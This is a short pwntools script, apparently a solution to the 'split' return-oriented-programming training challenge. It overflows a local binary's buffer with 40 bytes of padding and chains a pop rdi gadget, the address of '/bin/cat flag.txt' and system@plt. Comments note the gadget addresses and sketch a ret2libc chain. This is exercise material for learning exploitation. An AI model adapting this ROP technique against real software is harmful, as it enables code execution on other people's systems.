#!/usr/bin/env python3

from pwn import *


file = process('./split')

##gadgets
pop_rdi = 0x00000000004007c3 # ropper -f split -> to get the gadget POP_RDI
sys = 0x000000000040074b # with gdb into the functions [system@plt]
get_flag = 0x00601060 #rabin2 -z split -> take the "/bin/cat flag.txt"



junk = b'A'*40

payload = junk + p64(pop_rdi) + p64(get_flag) + p64(sys)

file.send(payload)
file.interactive()




#junk + pop_rdi + puts_got + puts_plt + main

#pwnme func = 0x00000000004006e8
#system func = 
#pop_rdi = 0x00000000004007c3 ( Nosso gadget )